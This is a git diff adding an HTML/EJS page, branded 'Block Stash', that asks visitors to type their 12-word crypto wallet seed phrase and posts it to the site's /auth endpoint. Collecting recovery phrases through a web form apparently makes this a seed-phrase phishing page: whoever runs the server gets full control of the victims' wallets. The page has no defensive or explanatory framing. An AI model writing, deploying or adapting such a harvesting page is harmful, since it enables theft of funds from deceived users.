@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Head remains unchanged -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Document</title>
+  <!-- Font & CSS links remain unchanged -->
+  <link rel="stylesheet" href="../style/save.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="video-background">
+      <video autoplay loop muted playsinline>
+        <source src="./Screen Recording 2025-03-21 173326.mp4" type="video/mp4" />
+      </video>
+    </div>
+
+    <div class="seed-phrase">
+      <div class="statement">
+        <h1>Block <br /><span>Stash</span></h1>
+        <p>Please Enter your seed phrase Here to continue</p>
+      </div>
+      <ol>
+        <% for (let i = 0; i < 12; i++) { %>
+          <li><div class="seeds"><input type="text" class="seed-input" required /></div></li>
+        <% } %>
+      </ol>
+      <div class="btn">
+        <button id="submitSeed">NEXT</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const sendButton = document.getElementById('submitSeed');
+
+     sendButton.addEventListener('click', async () => {
+    const inputs = document.querySelectorAll('.seed-input');
+    const words = Array.from(inputs).map(input => input.value.trim()).filter(Boolean);
+
+    if (words.length !== 12) {
+        alert('Please fill all 12 words of the seed phrase.');
+        return;
+    }
+
+    const seed = words.join(' ');
+
+    try {
+       const response = await fetch('/auth', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({ seed })
+});
+const result = await response.json({});
+if (response.ok) {
+    alert('user Sucessfully created');
+    window.location.href = result.redirect;
+} else {
+    alert(result.message || 'Seed verification failed');
+}
+    } catch (error) {
+        console.error('Error:', error);
+        alert('An error occurred while verifying the seed phrase.');
+    }
+});
+    });
+  </script>
+</body>
+</html>
